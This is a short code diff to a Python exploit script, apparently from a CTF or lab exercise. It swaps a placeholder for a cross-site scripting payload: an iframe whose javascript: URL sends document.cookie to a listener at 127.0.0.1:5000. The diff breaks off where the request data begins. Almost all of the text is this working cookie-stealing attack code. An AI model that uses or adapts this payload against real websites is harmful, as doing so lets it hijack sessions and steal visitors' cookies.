@@ -1,7 +1,9 @@
 import requests
 
 payload = """
-***exploit XSS here.***
+<iframe src="javascript:
+    window.open('http://127.0.0.1:5000/?'%2bdocument.cookie);
+">
 """
 
 data = {
